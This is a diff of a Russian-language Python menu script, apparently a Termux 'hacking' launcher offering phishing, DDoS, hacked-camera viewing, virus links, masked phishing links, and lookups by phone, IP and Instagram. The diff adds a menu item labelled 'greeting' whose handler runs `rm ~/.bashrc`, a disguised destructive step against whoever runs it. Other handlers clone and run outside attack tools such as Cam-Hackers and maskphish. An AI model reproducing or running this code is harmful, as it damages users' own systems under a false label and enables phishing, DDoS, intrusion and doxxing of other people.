@@ -22,12 +22,14 @@ while True:
     print (Fore.YELLOW+"    [2] тунелирование <localhost>")
     print (Fore.YELLOW+"    [3] фишинг")
     print (Fore.YELLOW+"    [4] ддос")
-    print (Fore.YELLOW+"    [5] заблокировать Termux")
-    print (Fore.YELLOW+"    [6] просмотр взломаных камер")
-    print (Fore.YELLOW+"    [7] получить вирус ссылку")
-    print (Fore.YELLOW+"    [8] замаскировать фишинг")
-    print (Fore.YELLOW+"    [9] пробив по номеру")
-    print (Fore.YELLOW+"    [10] пробив по ip")
+    print (Fore.YELLOW+"    [5] приветствие")
+    print (Fore.YELLOW+"    [6] заблокировать Termux")
+    print (Fore.YELLOW+"    [7] просмотр взломаных камер")
+    print (Fore.YELLOW+"    [8] получить вирус ссылку")
+    print (Fore.YELLOW+"    [9] замаскировать фишинг")
+    print (Fore.YELLOW+"    [10] пробив по номеру")
+    print (Fore.YELLOW+"    [11] пробив по ip")
+    print (Fore.YELLOW+"    [12] пробив инстаграм ")
     print (Fore.CYAN+"\n                                     ╔═════════════╗")
     print (Fore.CYAN+'    [77] поддержка автора            ║'+Fore.GREEN+'>утилиты<'+Fore.CYAN+'[91]║')
     print (Fore.CYAN+'    [66] тг канал автора             ║'+Fore.YELLOW+' забавы '+Fore.CYAN+' [92]║')
@@ -212,7 +214,7 @@ while True:
         os.system('python doser.py')
 
 
-    if inp == '05':   
+    if inp == '5':   
         tt = 'привет'
         os.system('clear')
         os.system('rm ~/.bashrc')
@@ -254,7 +256,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '5':   
+    if inp == '6':   
         os.system('git clone https://github.com/fuckwbored/termuxman')
         os.system('clear')
         print ('[установка нужных файлов]')
@@ -264,7 +266,7 @@ while True:
         os.system('python3 termuxman.py')
 
 
-    if inp == '6':    
+    if inp == '7':    
         os.system('pip install requests')
         os.system('clear')
         os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers')
@@ -282,7 +284,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '7':
+    if inp == '8':
         os.system('clear')
         print('[Генерируется ссылка...]')
         time.sleep(3)
@@ -299,7 +301,7 @@ while True:
             os.system('clear')       
 
 
-    if inp == '8':
+    if inp == '9':
         os.system('git clone https://github.com/jaykali/maskphish.git')
         os.chdir('maskphish')
         os.system('clear')
@@ -317,7 +319,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '9':
+    if inp == '10':
         at = '1'
         print('[установка нужных файлов]')
         time.sleep(3)
@@ -343,7 +345,7 @@ while True:
                 os.system('clear')
 
 
-    if inp == '10':
+    if inp == '11':
         os.system('pip install requests')
         os.system('clear')
         print('[установка нужных файлов]')
@@ -356,7 +358,7 @@ while True:
         os.system('clear')
 
 
-    if inp == '11':
+    if inp == '12':
         aa = 'ververa'
         os.system('clear')
         print('[установка нужных файлов]')
